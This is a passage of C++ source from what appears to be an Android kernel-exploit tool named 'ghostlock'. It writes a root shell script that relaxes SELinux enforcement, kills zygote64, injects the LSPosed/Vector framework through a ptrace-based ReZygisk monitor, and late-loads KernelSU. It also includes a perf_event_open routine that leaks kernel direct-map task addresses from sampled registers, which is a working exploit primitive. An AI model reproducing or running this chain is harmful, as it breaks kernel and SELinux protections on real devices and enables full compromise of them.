            /* One monitor at a time: a stale zygisk-ptrace64 from an earlier
             * run keeps the single-instance slot, and a second post-fs-data
             * then leaves a monitor that never arms its cp*.sock channel
             * (measured 2026-11-04: pfd with a live orphan produced no new
             * pid, no cp*.sock, and no injection). */
            "    for m in $(pidof zygisk-ptrace64 2>/dev/null | tr -d '\\r'); do\n"
            "      echo \"[*] killing stale monitor $m\" >>\"$LOG\"\n"
            "      kill -9 \"$m\" 2>>\"$LOG\"\n"
            "    done\n"
            /* setsid: the monitor has to outlive this su/attr-exec shell. It
             * inherits stdio, which also made an interactive caller hang on
             * the pipe, and a monitor without its own session is torn down
             * together with the caller instead of tracing init. */
            "    run_root \"export PATH=/system/bin:/system/xbin:/debug_ramdisk; setsid sh /data/adb/modules/rezygisk/post-fs-data.sh </dev/null >/dev/null 2>&1\" >>\"$LOG\" 2>&1 || PFD_RC=$?\n"
            "    echo \"[*] post-fs-data rc=$PFD_RC\" >>\"$LOG\"\n"
            "    [ -n \"$ENF_SAVED\" ] && echo \"$ENF_SAVED\" > /sys/fs/selinux/enforce 2>/dev/null\n"
            "    echo \"[*] enforce restored to $(cat /sys/fs/selinux/enforce 2>&1)\" >>\"$LOG\"\n"
            /* Poll in the parent, not through run_root: the monitor is a
             * sibling we just spawned, so the app's own shell can see it via
             * /proc without needing the module domain again. */
            "    MP=''\n"
            "    ZSOCK=''\n"
            "    i=0\n"
            "    while [ $i -lt 30 ]; do\n"
            "      MP=$(pidof zygisk-ptrace64 2>/dev/null | awk '{print $1}')\n"
            "      if [ -n \"$MP\" ]; then\n"
            "        ZSOCK=$(ls /data/adb/rezygisk/cp*.sock 2>/dev/null | head -1)\n"
            "        TP=$(sed -n 's/^TracerPid:[[:space:]]*//p' /proc/1/status 2>/dev/null)\n"
            "        if [ \"$TP\" = \"$MP\" ]; then break; fi\n"
            "      fi\n"
            "      sleep 1\n"
            "      i=$((i+1))\n"
            "    done\n"
            /* Pre-kill readiness is only "the monitor ptraces init". cp*.sock
             * cannot be part of it: 2026-11-05 showed the monitor creates that
             * socket only when it spawns zygiskd64 for a new zygote, so on a
             * warm device pfd alone never produces it (C2 required it and
             * fail-closed on an activation that would have worked). ZSOCK is
             * still collected for the log. */
            "    if [ \"$MP\" = \"$TP\" ] && [ -n \"$MP\" ]; then ZREADY=\"monitor=$MP tracing init\"; else ZREADY=''; fi\n"
            "    if [ -z \"$ZREADY\" ]; then\n"
            "      echo '[!] rezygisk not ready (monitor not tracing init); NOT restarting zygote' >>\"$LOG\"\n"
            "      echo '[!] the LSPosed stack stays inactive this run; run it again once the daemon is up' >>\"$LOG\"\n"
            "      echo '[*] pfsd.log:' >>\"$LOG\"\n"
            "      tail -n 40 /data/local/tmp/pfsd.log >>\"$LOG\" 2>&1\n"
            "      echo '[*] rezygisk bin:' >>\"$LOG\"\n"
            "      ls -l /data/adb/modules/rezygisk/bin >>\"$LOG\" 2>&1\n"
            "      echo \"[*] monitor=$(pidof zygisk-ptrace64 2>/dev/null) init_tracer=$(awk '/TracerPid/{print $2}' /proc/1/status 2>/dev/null) sock=${ZSOCK:-none}\" >>\"$LOG\"\n"
            "      ls -laZ /data/adb/rezygisk >>\"$LOG\" 2>&1\n"
            "      STATE=failed; BUSY=0; READY=0; ERROR=rezygisk not ready; write_status\n"
            "    else\n"
            "      echo '[*] rezygisk monitor ready' >>\"$LOG\"\n"
            "      STATE=zygote; write_status\n"
            "      cat >/data/local/tmp/.ghostlock_zrfinish.sh <<'ZRFINEOF'\n"
            "#!/system/bin/sh\n"
            "export PATH=/system/bin:/system/xbin:$PATH\n"
            "LOG='%s'\n"
            "HOME_DIR=${LOG%%/*}\n"
            "STATUS=\"$HOME_DIR/.ghostlock_status\"\n"
            "RUN_ID=$(sed -n 's/^run_id=//p' \"$STATUS\" 2>/dev/null | head -1)\n"
            "BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)\n"
            "SUPERVISOR_PID=$$\n"
            "STATE=waiting_injection\n"
            "BUSY=1\n"
            "READY=0\n"
            "ERROR=\n"
            "write_status() {\n"
            "  { echo 'schema=1'; echo \"run_id=$RUN_ID\"; echo \"boot_id=$BOOT_ID\"; echo \"pid=$SUPERVISOR_PID\"; echo \"state=$STATE\"; echo \"busy=$BUSY\"; echo \"ready=$READY\"; echo \"error=$ERROR\"; echo \"log=$LOG\"; echo \"updated=$(date +%%s 2>/dev/null)\"; } >\"$STATUS.tmp\" && chmod 644 \"$STATUS.tmp\" 2>/dev/null\n"
            "  # The status and log live in the app-private dir but are written by a root\n"
            "  # shell: without an explicit owner/label fix the app cannot read them, and\n"
            "  # mv would also replace the inode that carries the SELinux context.\n"
            "  _u=$(stat -c %%u \"$HOME_DIR\" 2>/dev/null)\n"
            "  _c=$(ls -Zd \"$HOME_DIR\" 2>/dev/null | cut -d' ' -f1)\n"
            "  case \"$_c\" in u:*) ;; *) _c= ;; esac\n"
            "  if [ -n \"$_u\" ]; then chown \"$_u:$_u\" \"$STATUS.tmp\" \"$LOG\" 2>/dev/null; fi\n"
            "  if [ -n \"$_c\" ]; then chcon \"$_c\" \"$STATUS.tmp\" \"$LOG\" 2>/dev/null; fi\n"
            "  mv -f \"$STATUS.tmp\" \"$STATUS\" 2>/dev/null\n"
            "  if [ \"$STATE\" = \"ready\" ] || [ \"$STATE\" = \"failed\" ]; then rm -f \"$HOME_DIR/.ghostlock_run_started\" 2>/dev/null; fi\n"
            "}\n"
            "finisher_exit() {\n"
            "  RC=$?\n"
            "  if [ \"$RC\" -ne 0 ] && [ \"$STATE\" != \"failed\" ] && [ \"$STATE\" != \"ready\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR=\"finisher exited $RC\"; write_status\n"
            "    echo \"[!] finisher exited $RC; marked failed\" >>\"$LOG\"\n"
            "  fi\n"
            "}\n"
            "trap finisher_exit EXIT\n"
            "write_status\n"
            "STATE_J=/data/adb/rezygisk/state.json\n"
            "ZROK=0\n"
            /* The socket and the daemon it names appear only after this script
             * has killed a zygote: the monitor spawns zygiskd64 when it follows
             * that new zygote (2026-11-05 device experiment). Wait for them
             * here, in a short window, before spending the longer 90 s on
             * state.json. */
            "ZDP=''\n"
            "ZCS=''\n"
            "i=0\n"
            "while [ $i -lt 30 ]; do\n"
            "  ZDP=$(pidof zygiskd64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "  ZCS=$(ls /data/adb/rezygisk/cp*.sock 2>/dev/null | head -1)\n"
            "  if [ -n \"$ZDP\" ] && [ -n \"$ZCS\" ]; then\n"
            "    echo \"[*] daemon armed zygiskd64=$ZDP ppid=$(awk '/^PPid:/{print $2}' /proc/$ZDP/status 2>/dev/null) sock=$ZCS at=$(date +%%s)\" >>\"$LOG\"\n"
            "    break\n"
            "  fi\n"
            "  sleep 1\n"
            "  i=$((i+1))\n"
            "done\n"
            "if [ -z \"$ZDP\" ] || [ -z \"$ZCS\" ]; then\n"
            "  STATE=failed; BUSY=0; READY=0; ERROR='rezygisk daemon not armed'; write_status\n"
            "  echo '[!] rezygisk daemon not armed after 30s; NOT starting the Vector daemon' >>\"$LOG\"\n"
            "  echo \"[!] zygiskd64=${ZDP:-none} sock=${ZCS:-none} monitor=$(pidof zygisk-ptrace64 2>/dev/null) init_tracer=$(sed -n 's/^TracerPid:[[:space:]]*//p' /proc/1/status 2>/dev/null)\" >>\"$LOG\"\n"
            "  ps -A -o PID,PPID,NAME,ARGS 2>/dev/null | grep zygisk >>\"$LOG\" 2>&1\n"
            "  ls -laZ /data/adb/rezygisk >>\"$LOG\" 2>&1\n"
            "  exit 1\n"
            "fi\n"
            "i=0\n"
            "while [ $i -lt 90 ]; do\n"
            "  ZOUT=$(cat \"$STATE_J\" 2>/dev/null)\n"
            "  ZDP=$(pidof zygiskd64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "  ZCS=$(ls /data/adb/rezygisk/cp*.sock 2>/dev/null | head -1)\n"
            "  if [ -n \"$ZDP\" ] && [ -n \"$ZCS\" ] && echo \"$ZOUT\" | grep -q '\"64\": 1' && echo \"$ZOUT\" | grep -q 'zygisk_vector' && echo \"$ZOUT\" | grep -q '\"state\": 1'; then\n"
            "    ZROK=1\n"
            "    echo \"[*] injection seen via state.json: rezygiskd.64 state=1, modules has zygisk_vector at=$(date +%%s)\" >>\"$LOG\"\n"
            "    break\n"
            "  fi\n"
            "  # Bypass: state.json is only written by the monitor that traced the\n"
            "  # zygote itself. A zygote injected by an earlier monitor (or before\n"
            "  # this monitor restart) never gets a state.json - but its maps\n"
            "  # already prove the zygisk_vector lib is loaded. Accept that, but\n"
            "  # still require this monitor's daemon and socket: without them a\n"
            "  # zygote kill that silently failed would pass on stale maps.\n"
            "  ZPID=$(pidof zygote64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "  if [ -n \"$ZDP\" ] && [ -n \"$ZCS\" ] && [ -n \"$ZPID\" ] && grep -q zygisk_vector /proc/$ZPID/maps 2>/dev/null; then\n"
            "    ZROK=1\n"
            "    echo \"[*] injection seen via maps: zygote pid=$ZPID already has zygisk_vector (state.json stale/absent) at=$(date +%%s)\" >>\"$LOG\"\n"
            "    break\n"
            "  fi\n"
            "  sleep 1\n"
            "  i=$((i+1))\n"
            "done\n"
            "if [ \"$ZROK\" != 1 ]; then\n"
            "  STATE=failed; BUSY=0; READY=0; ERROR='zygote injection gate failed'; write_status\n"
            "  echo '[!] injection gate failed after 90s; NOT starting the Vector daemon' >>\"$LOG\"\n"
            "  echo \"[!] rezygisk state: $ZOUT\" >>\"$LOG\"\n"
            "  echo \"[!] zygiskd64=${ZDP:-none} sock=${ZCS:-none} monitor=$(pidof zygisk-ptrace64 2>/dev/null) init_tracer=$(sed -n 's/^TracerPid:[[:space:]]*//p' /proc/1/status 2>/dev/null)\" >>\"$LOG\"\n"
            "  ps -A -o PID,PPID,NAME,ARGS 2>/dev/null | grep zygisk >>\"$LOG\" 2>&1\n"
            "  ls -laZ /data/adb/rezygisk >>\"$LOG\" 2>&1\n"
            "  exit 1\n"
            "fi\n"
            "STATE=injected; write_status\n"
            "# Vector daemon verifies the manager's IPC against /data/local/tmp/manager.apk;\n"
            "# a fresh install has no such file, so the manager reports \"not activated\"\n"
            "# even with a healthy framework. Copy it here (uid 0) before the daemon starts.\n"
            "MGR_APK=$(find /data/app -path '*/org.matrix.vector.manager*/base.apk' 2>/dev/null | head -1)\n"
            "if [ -n \"$MGR_APK\" ]; then\n"
            "  cp \"$MGR_APK\" /data/local/tmp/manager.apk 2>/dev/null\n"
            "  chmod 644 /data/local/tmp/manager.apk 2>/dev/null\n"
            "  chown 2000:2000 /data/local/tmp/manager.apk 2>/dev/null\n"
            "  echo \"[*] staged manager APK: $MGR_APK -> /data/local/tmp/manager.apk\" >>\"$LOG\"\n"
            "else\n"
            "  echo \"[!] org.matrix.vector.manager base.apk not found; daemon will reject manager IPC\" >>\"$LOG\"\n"
            "fi\n"
            /* A fixed 60s sleep both wasted time when system_server came back
             * early and raced the daemon when it came back late. Poll for the
             * framework instead: a pid different from the one recorded before
             * any zygote kill (the old instance cannot pass), binder reporting
             * the activity service, stable for 5s. Bounded at 120s so a
             * failed restart still fails fast and logs the reason. */
            "i=0; SM_STABLE=0; SM_LOCK=\n"
            "while [ \"$i\" -lt 120 ]; do\n"
            "  SM_P=$(pidof system_server 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "  if [ -n \"$SM_P\" ] && [ \"$SM_P\" != \"$SM_PRE\" ] && service check activity 2>/dev/null | grep -q found && [ \"$SM_P\" = \"$SM_LOCK\" ]; then\n"
            "    SM_STABLE=$((SM_STABLE+1))\n"
            "  else\n"
            "    SM_STABLE=0; SM_LOCK=\"$SM_P\"\n"
            "  fi\n"
            "  [ \"$SM_STABLE\" -ge 5 ] && break\n"
            "  sleep 1; i=$((i+1))\n"
            "done\n"
            "if [ \"$i\" -ge 120 ]; then\n"
            "  echo \"[!] system_server wait timed out after ${i}s (pid=${SM_P:-none} pre=${SM_PRE:-none} stable=${SM_STABLE}s); starting the daemon anyway\" >>\"$LOG\"\n"
            "fi\n"
            "echo \"[*] system_server ready: pid=${SM_P:-none} pre=${SM_PRE:-none} stable=${SM_STABLE}s waited=${i}s\" >>\"$LOG\"\n"
            "if [ -x /data/adb/modules/zygisk_vector/daemon ]; then\n"
            "  echo '[*] starting Vector daemon (it restarts system_server once)' >>\"$LOG\"\n"
            "  unshare -m /data/adb/modules/zygisk_vector/daemon --system-server-max-retry=3 >/data/local/tmp/vectord.log 2>&1 &\n"
            "  chown 2000:2000 /data/local/tmp/vectord.log 2>/dev/null\n"
            "  rm -f /data/adb/ghostlock-vector-managed\n"
            "  rm -f /data/local/tmp/.ghostlock_vector_managed\n"
            "fi\n"
            "sleep 20\n"
            "STATE=daemon; write_status\n"
            "STATE=stage2; write_status\n"
            "echo '[*] stage2 checks' >>\"$LOG\"\n"
            "CLI_OK=0\n"
            "i=0\n"
            "while [ $i -lt 12 ]; do\n"
            "  CLI_OUT=$(timeout 15 /data/adb/modules/zygisk_vector/cli status 2>&1)\n"
            "  case \"$CLI_OUT\" in *\"Framework Version\"*) CLI_OK=1; break;; esac\n"
            "  sleep 5\n"
            "  i=$((i+1))\n"
            "done\n"
            "if [ \"$CLI_OK\" = 1 ]; then\n"
            "  echo '[*] stage2 check cli=PASS' >>\"$LOG\"\n"
            "else\n"
            "  echo '[!] stage2 check cli=FAIL' >>\"$LOG\"\n"
            "  echo \"[!] stage2 cli output: $CLI_OUT\" >>\"$LOG\"\n"
            "fi\n"
            "STATE_OK=0\n"
            "if grep -q 'KernelSU' /data/adb/rezygisk/state.json 2>/dev/null && \\\n"
            "   grep -q 'zygisk_vector' /data/adb/rezygisk/state.json 2>/dev/null && \\\n"
            "   grep -q '\"64\": 1' /data/adb/rezygisk/state.json 2>/dev/null; then\n"
            "  STATE_OK=1\n"
            "  echo '[*] stage2 check state=PASS (state.json)' >>\"$LOG\"\n"
            "else\n"
            "  # Same bypass as the injection gate: state.json only exists for a\n"
            "  # zygote this monitor traced from its own start. A live zygote with\n"
            "  # zygisk_vector mapped is equivalent proof of injection.\n"
            "  ZPID=$(pidof zygote64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "  if [ -n \"$ZPID\" ] && grep -q zygisk_vector /proc/$ZPID/maps 2>/dev/null; then\n"
            "    STATE_OK=1\n"
            "    echo \"[*] stage2 check state=PASS (zygote pid=$ZPID maps, state.json absent)\" >>\"$LOG\"\n"
            "  else\n"
            "    echo '[!] stage2 check state=FAIL' >>\"$LOG\"\n"
            "  fi\n"
            "fi\n"
            "PID_OK=0\n"
            "if [ -n \"$(pidof zygisk-ptrace64 2>/dev/null)\" ]; then\n"
            "  PID_OK=1\n"
            "  echo '[*] stage2 check pid=PASS' >>\"$LOG\"\n"
            "else\n"
            "  echo '[!] stage2 check pid=FAIL' >>\"$LOG\"\n"
            "fi\n"
            "if [ \"$CLI_OK\" = 1 ] && [ \"$STATE_OK\" = 1 ] && [ \"$PID_OK\" = 1 ]; then\n"
            "  echo '[+] stage2 check PASS' >>\"$LOG\"\n"
            "else\n"
            "  echo \"[!] stage2 check FAIL cli=$CLI_OK state=$STATE_OK pid=$PID_OK\" >>\"$LOG\"\n"
            "fi\n"
            "if [ \"$CLI_OK\" = 1 ] && [ \"$STATE_OK\" = 1 ] && [ \"$PID_OK\" = 1 ]; then\n"
            "  STATE=ready; BUSY=0; READY=1; ERROR=; write_status\n"
            "  echo 'op:activation ok' >>\"$LOG\"\n"
            "  echo '[+] LSPosed stack setup done' >>\"$LOG\"\n"
            "  if [ \"$READY\" = 1 ]; then\n"
            "    echo '[*] supervisor ready' >>\"$LOG\"\n"
            "    HB=0\n"
            "    while :; do\n"
            "      HB=$((HB+1))\n"
            "      if [ \"$READY\" = 1 ] && [ $HB -ge 30 ]; then HB=0; write_status; fi\n"
            "      sleep 1\n"
            "    done\n"
            "  fi\n"
            "else\n"
            "  echo '[!] activation stopped: stage2 checks failed' >>\"$LOG\"\n"
            "  echo '[*] vectord.log:' >>\"$LOG\"\n"
            "  tail -n 60 /data/local/tmp/vectord.log >>\"$LOG\" 2>&1\n"
            "  echo '[*] rezygisk state:' >>\"$LOG\"\n"
            "  cat /data/adb/rezygisk/state.json >>\"$LOG\" 2>&1\n"
            "  if [ ! -x /data/adb/modules/zygisk_vector/daemon ]; then\n"
            "    echo '[!] Vector daemon missing or not executable' >>\"$LOG\"\n"
            "  fi\n"
            "  STATE=failed; BUSY=0; READY=0; ERROR='stage2 failed'; write_status\n"
            "  exit 1\n"
            "fi\n"
            "ZRFINEOF\n"
            "      chown 2000:2000 /data/local/tmp/.ghostlock_zrfinish.sh 2>/dev/null\n"
            "      if [ ! -s /data/local/tmp/.ghostlock_zrfinish.sh ]; then\n"
            "        STATE=failed; BUSY=0; READY=0; ERROR=finisher missing; write_status\n"
            "        echo '[!] finisher missing; not restarting zygote' >>\"$LOG\"\n"
            "      else\n"
            "        rm -f /data/adb/rezygisk/state.json\n"
            /* No monitor restart here any more. The monitor that traces init is
             * the one started above; killing and re-starting it is what lost
             * the 2026-11-04 12:20 run. Re-check it is still the same pid
             * tracing init right before the kill. cp*.sock is deliberately
             * not required: it appears only after this kill (2026-11-05). */
            "        MP=$(pidof zygisk-ptrace64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "        TP=$(sed -n 's/^TracerPid:[[:space:]]*//p' /proc/1/status 2>/dev/null | tr -d '\\r')\n"
            "        CS=$(ls /data/adb/rezygisk/cp*.sock 2>/dev/null | head -1)\n"
            "        if [ -z \"$MP\" ] || [ \"$TP\" != \"$MP\" ]; then\n"
            "          STATE=failed; BUSY=0; READY=0; ERROR='rezygisk monitor not armed'; write_status\n"
            "          echo \"[!] monitor not armed (monitor=${MP:-none} init_tracer=${TP:-none} sock=${CS:-none}); NOT killing zygote\" >>\"$LOG\"\n"
            "          ls -laZ /data/adb/rezygisk >>\"$LOG\" 2>&1\n"
            "          exit 1\n"
            "        fi\n"
            "        echo \"[*] monitor armed pid=$MP at=$(date +%%s)\" >>\"$LOG\"\n"
            "        SM_PRE=\"$SM_PRE\" setsid sh /data/local/tmp/.ghostlock_zrfinish.sh </dev/null >/dev/null 2>&1 &\n"
            "        echo '[*] finisher detached; restarting zygote64' >>\"$LOG\"\n"
            "        OLD_ZYGOTE=''\n"
            "        for zp in $(pidof zygote64 2>/dev/null | tr -d '\\r'); do\n"
            "          if [ \"$(cat /proc/$zp/comm 2>/dev/null)\" = \"zygote64\" ] || \\\n"
            "             tr '\\0' ' ' < /proc/$zp/cmdline 2>/dev/null | grep -q zygote64; then\n"
            "            PP=$(awk '/^PPid:/{print $2}' /proc/$zp/status 2>/dev/null)\n"
            "            if [ \"$PP\" = \"1\" ]; then OLD_ZYGOTE=$zp; break; fi\n"
            "          fi\n"
            "        done\n"
            "        if [ -n \"$OLD_ZYGOTE\" ]; then\n"
            "          echo \"[*] killing zygote64 pid=$OLD_ZYGOTE (comm/cmdline/PPID verified) at=$(date +%%s)\" >>\"$LOG\"\n"
            "          kill -9 $OLD_ZYGOTE >>\"$LOG\" 2>&1\n"
            "        else\n"
            "          echo '[!] no verified zygote64 found; NOT killing anything' >>\"$LOG\"\n"
            "        fi\n"
            "      fi\n"
            "    fi\n"
            "  fi\n"
            "else\n"
            "  echo '[*] no LSPosed component packages selected; skipping the stack' >>\"$LOG\"\n"
            "  STATE=root; BUSY=0; READY=0; write_status\n"
            "fi\n"
            "if [ \"$SELINUX_FIXUP\" = \"0\" ]; then\n"
            "  if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "    echo '[*] late-load (last step of the app route)' >>\"$LOG\"\n"
            "    chmod 755 \"$KSUD\" 2>/dev/null\n"
            "    timeout 60 \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "    echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
            "  else\n"
            "    echo '[*] late-load skipped (last step): kernelsu already loaded' >>\"$LOG\"\n"
            "  fi\n"
            "  if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "    echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
            "  else\n"
            "    echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
            "  fi\n"
            "fi\n"
            "else\n"
            "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
            "fi\n",
            (config::runtime_config_snapshot().home_dir.c_str()),
            (config::runtime_config_snapshot().ksu_log_path.c_str()),
            session::g_exploit_session.profile.safe_mode() ? 1 : 0,
            (config::runtime_config_snapshot().ksud_path.c_str()),
            lspd_modules,
            (config::runtime_config_snapshot().selinux_fixup ? "1" : "0"),
            (config::runtime_config_snapshot().phase.c_str()),
            (config::runtime_config_snapshot().debug_dir.c_str()),
            (config::runtime_config_snapshot().ksu_log_path.c_str()));
        if (n < 0 || n >= static_cast<int32_t>(script.size())) {
            pr_warning("root script too long\n");
            return;
        }
        if (write(sfd.get(), script.data(), static_cast<size_t>(n)) != n) {
            pr_warning("write root script failed errno=%d\n", errno);
        }
        sfd.reset();
        chmod((config::runtime_config_snapshot().root_script_path.c_str()), 0755);
        pr_info("root script written path=%s bytes=%d\n", (config::runtime_config_snapshot().root_script_path.c_str()),
                n);
    }

    /* Find a task through perf sample records. */
    uintptr_t perf_find_task(void) {
        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 5000;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = (1ULL << 32) - 1;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;

        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0)));
        if (!fd.valid()) {
            pr_warning("perf_event_open failed errno=%d\n", errno);
            return 0;
        }
        constexpr size_t kPerfPageSize = 4096;
        constexpr size_t kPerfDataPages = 32;
        constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
        const size_t msz = kPerfPageSize + kPerfDataSize;
        void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) {
            pr_warning("perf mmap failed errno=%d\n", errno);
            return 0;
        }
        /* Declaration order keeps the original release order: munmap (buf) runs
         * before close (fd) when this scope exits. */
        support::MappedRegion buf(mapped, msz);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        for (int32_t i = 0; i < 500000; i++) syscall(__NR_getpid);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
        uint64_t pos = hdr->data_tail;
        std::array<uintptr_t, 256> cands{};
        int32_t nc = 0;
        while (pos < head && nc < static_cast<int32_t>(cands.size())) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(
                base + (pos % kPerfDataSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *p = reinterpret_cast<char *>(ev) + sizeof(*ev);
                p += 8; /* skip IP */
                uint64_t abi = *reinterpret_cast<uint64_t *>(p);
                p += 8;
                if (abi == 1 || abi == 2) {
                    uint64_t *regs = reinterpret_cast<uint64_t *>(p);
                    for (int32_t i = 0; i < 32 && nc < static_cast<int32_t>(cands.size()); i++) {
                        uint64_t v = regs[i];
                        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
                        v |= 0x0fULL << 56;
                        if (in_direct_map(v))
                            cands[static_cast<size_t>(nc++)] = v;
                    }
                }
            }
            pos += ev->size;
        }
        hdr->data_tail = head;
        if (!nc) return 0;
        uintptr_t best = 0;
        int32_t best_cnt = 0;
        for (int32_t i = 0; i < nc; i++) {
            const auto at = cands[static_cast<size_t>(i)];
            const int32_t cnt = static_cast<int32_t>(
                std::count(cands.begin(), cands.begin() + nc, at));
            if (cnt > best_cnt) {
                best_cnt = cnt;
                best = at;
            }
        }
        pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
        return best;
    }
} // namespace ghostlock::attack

/* build-probe 1793069508 */
